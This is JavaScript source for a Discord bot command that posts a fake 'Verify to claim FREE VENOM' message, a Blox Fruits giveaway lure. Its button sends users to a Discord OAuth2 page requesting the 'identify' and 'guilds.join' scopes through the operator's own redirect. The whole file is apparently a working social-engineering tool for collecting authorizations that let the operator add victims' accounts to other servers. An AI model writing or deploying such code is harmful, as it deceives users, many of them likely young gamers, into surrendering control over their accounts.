const discord = require('discord.js')

const epic = require("../../epic")
const { EmbedBuilder, codeBlock } = require("@discordjs/builders");
const {  ApplicationCommandOptionType, PermissionFlagsBits, ChatInputCommandInteraction } = require("discord.js");
const { ApplicationCommandType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
module.exports = {
  name: "bloxfruit",
  description: "bloxfruit",
  default_permission: true,
  timeout: 3000,
  category: "whitelist",
userPerms: [discord.PermissionFlagsBits.SendMessages],
  ownerOnly: false,

 run: async (client, interaction, args) => {
   
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel(`Accept`)
      .setStyle(ButtonStyle.Link)
     .setURL(`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`)
          
      );
  interaction.deferReply();
  interaction.deleteReply();
  interaction.channel.send({embeds: [new discord.EmbedBuilder().setDescription(`*🔗  Verification*

**Verify to claim FREE VENOM**

`)
.setImage("https://pic.bstarstatic.com/ugc/048e2e3f9e859d39997cc85fe2c46ae4bf3f9e35.jpg@960w_540h_1e_1c_1f.webp")
        .setColor("#54183a")
                                    ], components: [row]})


    
  }
}